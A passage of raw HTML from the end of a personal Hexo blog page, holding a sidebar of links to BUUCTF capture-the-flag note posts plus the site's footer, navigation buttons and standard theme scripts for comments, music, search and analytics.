href="/posts/aea4d4bd/" title="BUUCTF 刷题笔记——Crypto 1"><img src="https://pic.h-t-m.ltd/img/BUUCTF-Crypto.webp" onerror='this.onerror=null,this.src="/img/404.jpg"' alt="BUUCTF 刷题笔记——Crypto 1"></a><div class="content"><a class="title" href="/posts/aea4d4bd/" title="BUUCTF 刷题笔记——Crypto 1">BUUCTF 刷题笔记——Crypto 1</a><time datetime="2022-10-23T06:36:23.000Z" title="发表于 2022-10-23 14:36:23">2022-10-23</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/bf54f980/" title="BUUCTF 刷题笔记——Misc 1"><img src="https://pic.h-t-m.ltd/img/BUUCTF-Misc.webp" onerror='this.onerror=null,this.src="/img/404.jpg"' alt="BUUCTF 刷题笔记——Misc 1"></a><div class="content"><a class="title" href="/posts/bf54f980/" title="BUUCTF 刷题笔记——Misc 1">BUUCTF 刷题笔记——Misc 1</a><time datetime="2022-10-21T12:16:53.000Z" title="发表于 2022-10-21 20:16:53">2022-10-21</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/ee33782f/" title="BUUCTF 刷题笔记——Reverse 1"><img src="https://pic.h-t-m.ltd/img/BUUCTF-Reverse.webp" onerror='this.onerror=null,this.src="/img/404.jpg"' alt="BUUCTF 刷题笔记——Reverse 1"></a><div class="content"><a class="title" href="/posts/ee33782f/" title="BUUCTF 刷题笔记——Reverse 1">BUUCTF 刷题笔记——Reverse 1</a><time datetime="2022-10-19T13:23:23.000Z" title="发表于 2022-10-19 21:23:23">2022-10-19</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/477423cc/" title="BUUCTF 刷题笔记——Web 1"><img src="https://pic.h-t-m.ltd/img/BUUCTF-Web.webp" onerror='this.onerror=null,this.src="/img/404.jpg"' alt="BUUCTF 刷题笔记——Web 1"></a><div class="content"><a class="title" href="/posts/477423cc/" title="BUUCTF 刷题笔记——Web 1">BUUCTF 刷题笔记——Web 1</a><time datetime="2022-10-08T05:23:35.000Z" title="发表于 2022-10-08 13:23:35">2022-10-08</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/9e217072/" title="BUUCTF 刷题笔记——PWN 1"><img src="https://pic.h-t-m.ltd/img/BUUCTF-PWN.webp" onerror='this.onerror=null,this.src="/img/404.jpg"' alt="BUUCTF 刷题笔记——PWN 1"></a><div class="content"><a class="title" href="/posts/9e217072/" title="BUUCTF 刷题笔记——PWN 1">BUUCTF 刷题笔记——PWN 1</a><time datetime="2022-09-22T15:29:05.000Z" title="发表于 2022-09-22 23:29:05">2022-09-22</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright"><span>&copy;2020 - 2022<svg style="width:1.5em;height:1.5em" aria-hidden="true"><use xlink:href="#icon-Butterfly"></use></svg></span><span>h-t-m</span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="font-plus" type="button" title="放大字体"><i class="fas fa-plus"></i></button><button id="font-minus" type="button" title="缩小字体"><i class="fas fa-minus"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><div class="search-dialog__title" id="local-search-title">本地搜索</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"></div></div></div><hr><div id="local-search-results"></div><span class="search-close-button"><i class="fas fa-times"></i></span></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/instantpage.min.js" type="module"></script><script src="https://npm.elemecdn.com/node-snackbar/dist/snackbar.min.js"></script><script src="/js/search/local-search.js"></script><script async>var preloader={endLoading:()=>{document.body.style.overflow="auto",document.getElementById("loading-box").classList.add("loaded")},initLoading:()=>{document.body.style.overflow="",document.getElementById("loading-box").classList.remove("loaded")}};window.addEventListener("load",preloader.endLoading()),setTimeout((function(){preloader.endLoading()}),5e3)</script><div class="js-pjax"><link rel="stylesheet" href="https://npm.elemecdn.com/katex@latest/dist/katex.min.css"><script src="https://npm.elemecdn.com/katex@latest/dist/contrib/copy-tex.min.js"></script><link rel="stylesheet" href="https://npm.elemecdn.com/katex@latest/dist/contrib/copy-tex.css"><script>document.querySelectorAll("#article-container span.katex-display").forEach((a=>{btf.wrap(a,"div",{class:"katex-wrap"})}))</script><script>document.getElementsByClassName("mermaid").length&&(window.mermaidJsLoad?mermaid.init():getScript("https://npm.elemecdn.com/mermaid/dist/mermaid.min.js").then((()=>{window.mermaidJsLoad=!0,mermaid.initialize({theme:"default"}),mermaid.init()})))</script><script>(()=>{const t=document.getElementById("twikoo-count"),e=()=>{twikoo.init(Object.assign({el:"#twikoo-wrap",envId:"https://twikoo-beta-seven.vercel.app/",region:""},null))},o=()=>{twikoo.getCommentsCount({envId:"https://twikoo-beta-seven.vercel.app/",region:"",urls:[window.location.pathname],includeReply:!1}).then((function(e){t.innerText=e[0].count})).catch((function(t){console.error(t)}))},n=(n=!1)=>{"object"==typeof twikoo?(e(),n&&t&&setTimeout(o,0)):getScript("https://npm.elemecdn.com/twikoo/dist/twikoo.all.min.js").then((()=>{e(),n&&t&&setTimeout(o,0)}))};btf.loadComment(document.getElementById("twikoo-wrap"),n)})()</script></div><div class="aplayer no-destroy" data-id="6751330199" data-server="netease" data-type="playlist" data-fixed="true" data-mini="true" data-listfolded="false" data-order="random" data-preload="none" data-autoplay="true" muted></div><script async src="/js/diytitle.js"></script><script async src="//at.alicdn.com/t/font_2987331_rwt2gum52cl.js"></script><script async src="//at.alicdn.com/t/font_3365955_q52nda6gxac.js"></script><script defer id="fluttering_ribbon" mobile="true" src="https://npm.elemecdn.com/butterfly-extsrc@1/dist/canvas-fluttering-ribbon.min.js"></script><script src="https://npm.elemecdn.com/butterfly-extsrc@1/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful=!0,POWERMODE.shake=!0,POWERMODE.mobile=!1,document.body.addEventListener("input",POWERMODE)</script><script id="click-show-text" src="https://npm.elemecdn.com/butterfly-extsrc@1/dist/click-show-text.min.js" data-mobile="false" data-text="I,LOVE,YOU,太毛" data-fontsize="15px" data-random="false" async></script><link rel="stylesheet" href="https://npm.elemecdn.com/aplayer/dist/APlayer.min.css" media="print" onload='this.media="all"'><script src="https://npm.elemecdn.com/aplayer/dist/APlayer.min.js"></script><script src="/js/Meting.min.js"></script><script src="https://npm.elemecdn.com/pjax/pjax.min.js"></script><script>let pjaxSelectors=["title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"];var pjax=new Pjax({elements:'a:not([target="_blank"]):not([href="/bb/"])',selectors:pjaxSelectors,cacheBust:!1,analytics:!0,scrollRestoration:!1});document.addEventListener("pjax:send",(function(){if(window.removeEventListener("scroll",window.tocScrollFn),window.removeEventListener("scroll",scrollCollect),"object"==typeof preloader&&preloader.initLoading(),window.aplayers)for(let e=0;e<window.aplayers.length;e++)window.aplayers[e].options.fixed||window.aplayers[e].destroy();"object"==typeof typed&&typed.destroy();const e=document.body.classList;e.contains("read-mode")&&e.remove("read-mode")})),document.addEventListener("pjax:complete",(function(){window.refreshFn(),document.querySelectorAll("script[data-pjax]").forEach((e=>{const t=document.createElement("script"),o=e.text||e.textContent||e.innerHTML||"";Array.from(e.attributes).forEach((e=>t.setAttribute(e.name,e.value))),t.appendChild(document.createTextNode(o)),e.parentNode.replaceChild(t,e)})),GLOBAL_CONFIG.islazyload&&window.lazyLoadInstance.update(),"function"==typeof chatBtnFn&&chatBtnFn(),"function"==typeof panguInit&&panguInit(),"function"==typeof gtag&&gtag("config","UA-214297516-1",{page_path:window.location.pathname}),"object"==typeof _hmt&&_hmt.push(["_trackPageview",window.location.pathname]),"function"==typeof loadMeting&&document.getElementsByClassName("aplayer").length&&loadMeting(),"object"==typeof Prism&&Prism.highlightAll(),"object"==typeof preloader&&preloader.endLoading()})),document.addEventListener("pjax:error",(e=>{404===e.request.status&&pjax.loadUrl("/404.html")}))</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div class="app-refresh" id="app-refresh" style="position:fixed;top:-2.2rem;left:0;right:0;z-index:99999;padding:0 1rem;font-size:15px;height:2.2rem;transition:all .3s ease"><div class="app-refresh-wrap" style="display:flex;color:#fff;height:100%;align-items:center;justify-content:center"><label>✨ h-t-m 更新了 👉</label><a href="javascript:void(0)" onclick="location.reload()"><span style="color:#fff;text-decoration:underline;cursor:pointer">👨‍💻立即刷新👌</span></a></div></div><script>function showNotification(){if(GLOBAL_CONFIG.Snackbar){var t="light"===document.documentElement.getAttribute("data-theme")?GLOBAL_CONFIG.Snackbar.bgLight:GLOBAL_CONFIG.Snackbar.bgDark,e=GLOBAL_CONFIG.Snackbar.position;Snackbar.show({text:"✨ h-t-m 更新了 👉",backgroundColor:t,duration:5e5,pos:e,actionText:"👨‍💻立即刷新👌",actionTextColor:"#fff",onActionClick:function(t){location.reload()}})}else{var o=`top: 0; background: ${"light"===document.documentElement.getAttribute("data-theme")?"#49b1f5":"#1f1f1f"};`;document.getElementById("app-refresh").style.cssText=o}}"serviceWorker"in navigator&&(navigator.serviceWorker.controller&&navigator.serviceWorker.addEventListener("controllerchange",(function(){showNotification()})),window.addEventListener("load",(function(){navigator.serviceWorker.register("/sw.js")})))</script></div><script>var fdata={apiurl:"https://fcircle-h-t-m.vercel.app/api",initnumber:20,stepnumber:10,error_img:"https://cdn.jsdelivr.net/npm/akilar-candyassets/image/404.gif"};localStorage.setItem("fdatalist",JSON.stringify(fdata))</script><script defer src="https://cdn.jsdelivr.net/npm/hexo-filter-fcircle/assets/js/fetch.min.js"></script><script data-pjax>function butterfly_clock_injector_config(){var l=document.getElementsByClassName("sticky_layout")[0];console.log("已挂载butterfly_clock"),l.insertAdjacentHTML("afterbegin",'<div class="card-widget card-clock"><div class="card-glass"><div class="card-background"><div class="card-content"><div id="hexo_electric_clock"><img class="entered loading" id="card-clock-loading" src="/images/~logo.gif" style="height: 120px; width: 100%;" data-ll-status="loading"/></div></div></div></div></div>')}for(var elist="null".split(","),cpage=location.pathname,epage="all",flag=0,i=0;i<elist.length;i++)cpage.includes(elist[i])&&flag++;("all"===epage&&0==flag||epage===cpage)&&butterfly_clock_injector_config()</script><script src="https://pv.sohu.com/cityjson?ie=utf-8"></script><script data-pjax src="https://npm.elemecdn.com/hexo-butterfly-clock/lib/clock.min.js"></script><script data-pjax>function butterfly_footer_beautify_injector_config(){var t=document.getElementById("footer-wrap");console.log("已挂载butterfly_footer_beautify"),t.insertAdjacentHTML("beforeend",'<div id="workboard"></div><p id="ghbdages"><a class="github-badge" target="_blank" href="https://hexo.io/" style="margin-inline:5px" data-title="博客框架为Hexo_v5.4.0" title=""><img src="https://pic.h-t-m.ltd/img/Frame-Hexo.svg" alt=""/></a><a class="github-badge" target="_blank" href="https://butterfly.js.org/" style="margin-inline:5px" data-title="主题版本Butterfly_v3.8.2" title=""><img src="https://pic.h-t-m.ltd/img/Theme-Butterfly.svg" alt=""/></a><a class="github-badge" target="_blank" href="https://vercel.com/" style="margin-inline:5px" data-title="本站默认线路托管于Vercel" title=""><img src="https://pic.h-t-m.ltd/img/Hosted-Vercel.svg" alt=""/></a><a class="github-badge" target="_blank" href="https://github.com/" style="margin-inline:5px" data-title="本站项目由Gtihub托管" title=""><img src="https://pic.h-t-m.ltd/img/Source-Github.svg" alt=""/></a><a class="github-badge" target="_blank" href="https://www.upyun.com/?utm_source=lianmeng&amp;utm_medium=referral" style="margin-inline:5px" data-title="本网站由又拍云提供 CDN 加速 / 云储存服务" title=""><img src="https://pic.h-t-m.ltd/img/upyun.svg" alt=""/></a><a class="github-badge" target="_blank" href="http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=42011502001415" style="margin-inline:5px" data-title="本站已完成公安备案，备案号鄂公网安备 42011502001415号" title=""><img src="https://pic.h-t-m.ltd/img/police-beian.svg" alt=""/></a><a class="github-badge" target="_blank" href="https://beian.miit.gov.cn/#/Integrated/index" style="margin-inline:5px" data-title="本站已在工信部备案，备案号赣ICP备2021010131号-2" title=""><img src="https://pic.h-t-m.ltd/img/beian.svg" alt=""/></a><a class="github-badge" target="_blank" href="https://icp.gov.moe/?keyword=20220223" style="margin-inline:5px" data-title="本站已在萌国备案，备案号萌ICP备20220223号" title=""><img src="https://pic.h-t-m.ltd/img/moe-beian.svg" alt=""/></a></p>')}for(var elist="null".split(","),cpage=location.pathname,epage="all",flag=0,i=0;i<elist.length;i++)cpage.includes(elist[i])&&flag++;("all"===epage&&0==flag||epage===cpage)&&butterfly_footer_beautify_injector_config()</script><script async src="/js/runtime.js"></script><script async src="//at.alicdn.com/t/font_3365955_q52nda6gxac.js"></script></body></html>